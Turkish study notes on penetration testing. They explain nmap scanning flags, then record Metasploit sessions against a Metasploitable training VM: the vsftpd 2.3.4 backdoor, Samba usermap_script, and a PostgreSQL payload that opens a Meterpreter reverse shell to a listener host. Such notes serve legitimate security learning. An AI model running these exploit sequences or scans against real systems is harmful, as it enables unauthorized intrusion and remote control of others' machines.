### Sunucu ve Bilgisayar Sızma Testleri

**_Recon_**

- Hedef hakkında bilgi toplama süreci

**_ Exploit _**

- Bir sistemdeki güvenlik açığını kullanarak istenmeyen bir işlem yaptıran kod veya tekniktir.
- Kapı kilidi bozuk → güvenlik açığı
- O bozuk kilitten içeri girme yöntemi → exploit

**_CTF_**

- Güvenlik açıklarını bulup çözerek “flag” (gizli kod) elde ettiğin eğitim yarışmasıdır.

**_Metasploitable_**

- Metasploitable, siber güvenlikte eğitim ve test amaçlı kullanılan bilerek zayıf bırakılmış bir sanal makinedir.

**_nmap_**

- Bir hedefte hangi kapılar (portlar) açık ve hangi servisler çalışıyor onu gösteren ağ tarama aracıdır.
- nessus, nmap alternatif

**_Temel nmap Komutları_**

~nmap 192.168.1.10 //Açık portlar,En temel bilgi

~nmap -v -sS -A -T4 target //Bu hedefi hızlı ve agresif şekilde didik didik et;
OS’ini, servislerini, versiyonlarını, script sonuçlarını bana göster.

~nmap -p 1-65535 -sV -sS -T4 target //-p 1-65535 -TÜM portları tarar,-sS (SYN Scan – Stealth)- Yarı açık tarama,-sV (Service Version Detection)
-Servis + versiyon öğrenir,-T4 (Timing Template) -Hız ayarı...Bu hedefteki TÜM portları, stealth şekilde tara,
açık olan servislerin versiyonlarını bul, hızlı yap.

~nmap --top-ports 1000 192.168.1.10 //Hızlı ,Tüm önemli portlar (en çok kullanılan)

~nmap -p- 192.168.1.10 // Tüm portlar (tam tarama),Yavaş ama kapsamlı

~nmap -sV 192.168.1.10 //Servis versiyonu tespiti,SSH versiyonu vs.

~nmap -O 192.168.1.10 //İşletim sistemi tespiti

~nmap -A 192.168.1.10//En kritik kombine komut, OS,Servis,Script,Traceroute

~nmap -sS 192.168.1.10 //Stealth SYN Scan (en popüler),Sessiz

~nmap -sC 192.168.1.10//Script taramaları (NSE)

~nmap -p 80,443 --script http-title,http-headers 192.168.1.10//Web servislerini tarama

~nmap -Pn 192.168.1.1 //GİZLİLİK / FIREWALL TEST,Ping atlamaz,ICMP kapalıysa şart

~nmap -T2 192.168.1.10 //Yavaş & dikkat çekmeyen

~nmap -oA scan_result 192.168.1.10//ÇIKTI KAYDETME (ÇOK ÖNEMLİ)

--ÖZETİ--

nmap → temel
-p- → tüm portlar
-sS → stealth // Daha az fark edilerek yapılan tarama demektir.
-sV → servis //HTTP,SSH,MySQL...
-O → OS //Hedef sistemin hangi işletim sistemini kullandığını tahmin etme olayıdır.
-sC → script
-A → hepsi

**_Sunucu-Bilgisayar Hackleme_**

- portları exploitdb/rapid7 sitelerinden açık var mı bak

* portlar değil servisler hacklenir
  ~nmap -v -sS -A -T4 target //sonuçlar kaydedilip açık portlarla sızma denemeleri yapılır.Metasploitable a

* Açık portlar sızma testleri için başlangıç noktasıdır; ancak başarı, ilgili serviste bir zafiyet bulunmasına bağlıdır.

* İlk test 21 portu ftp açık portunda version kısmını cp yap "vsftpd 2.3.4" yanına exploit yazıp arat. rapid7 da hackleme/test için oluşturulmuş modüller

1. -- FTP ile Hacklemek -- port21

~msfconsole //Metasploit Console giriş yapılır
msf6> ~use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(unix/ftp/vsftpd_234_backdoor)> ~show options
msf6 exploit(unix/ftp/vsftpd_234_backdoor)> ~set target 0
msf6 exploit(unix/ftp/vsftpd_234_backdoor)>set rhosts 10.0.2.5
msf6 exploit(unix/ftp/vsftpd_234_backdoor)> ~show options //bu sefer hedef çıkar
msf6 exploit(unix/ftp/vsftpd_234_backdoor)> ~show targets //hedefleri gösterir
msf6 exploit(unix/ftp/vsftpd_234_backdoor)> ~exploit -j -z //exploit çalıştırılır (başarı zafiyete bağlıdır)

msf6 exploit(unix/ftp/vsftpd_234_backdoor)> ~sessions -l //açık olan bağlantıların listesi çıkar
msf6 exploit(unix/ftp/vsftpd_234_backdoor)> ~sessions 1

~ls //çalıştır hacklenen bilgisayarın ls çıkarır
~uname -a //içersinde olduğunuz linux hakkında bilgi verir. Hangi makinede olduğunu kurban/kendi gösterir

2. -- Telnet vs SSH Hacklemek --port23-port22

- SSH açık İstemci ↔ Sunucu arasındaki iletişim korur

- Telnet şifreleme yok,zayıf,her şey okunabilir,şifreler ele eçirilebilir
- SSH ağ trafiği şifreli,kimlik doğrular,veri gizliliği. Sunucular bunu kullanır. Telnet'in yerini aldı.

* En güvenli telnet kapalı SSH açık, SSH hardening yapılmış

3. -- SAMBA Hacklemek --

- Samba, Linux / Unix sistemlerin Windows ağlarıyla konuşmasını sağlayan bir servistir.Linux ↔ Windows dosya paylaşımı,Yazıcı paylaşımı, Ağ üzerinden klasör erişimi..

- nmap sonucundaki "Samba smbd 3.X - 4.X" cp ve exploitdb/rapid7 ten nasıl hackleneceğine bak

~msfconsole
msf6> use exploit/multi/samba/usermap_scrip
msf6 exploit(multi/samba/usermap_scrip) > show options
msf6 exploit(multi/samba/usermap_scrip) > set rhosts 10.0.2.5
msf6 exploit(multi/samba/usermap_scrip) > show options //gözükmeli artık
msf6 exploit(multi/samba/usermap_scrip) > exploit -j -z
msf6 exploit(multi/samba/usermap_scrip) > sessions -l
msf6 exploit(multi/samba/usermap_scrip) > sessions 1
uname -a //hacklediğin servis mi bak
ls

4. --Meterpreter--SQL Port 1433 / 3306 / 5432

- Bir sisteme erişim sağlandıktan sonra: Komut çalıştırma, Dosya işlemleri, Ekran görüntüsü, Keylogging (yetkili testte) ,Ağ pivoting, Yetki yükseltme (uygun senaryoda)
- Meterpreter’in SQL servisi üzerinden tetiklenmiş olması muhtemel.Hep sql portuyla tetiklenmeyebilir

- nmap sonuçlarında "PostgreSQL DB 8.3.0 - 8.3.7 cp ve exploitdb/rapid7 ten nasıl hackleneceğine bak

~msfconsole
~msf6> use exploit/linux/postgres/postgres_payload
msf6 exploit(linux/postgres/postgres_payload) > show options
msf6 exploit(linux/postgres/postgres_payload) > set rhosts 10.0.2.5
msf6 exploit(linux/postgres/postgres_payload) > set lhost 10.0.2.2 //localhost kendi ip
msf6 exploit(linux/postgres/postgres_payload) > exploit -j -z
msf6 exploit(linux/postgres/postgres_payload) > sessions -l
msf6 exploit(linux/postgres/postgres_payload) > sessions 1

meterpreter > //açılır
meterpreter > help //yapabileceklerin çıkar

**_Genel Güvenlik Nasıl Sağlanır_**

- Exploit’i engelle
- Zafiyeti kapat
- Yetkiyi sınırla
- Anomaliyi yakala
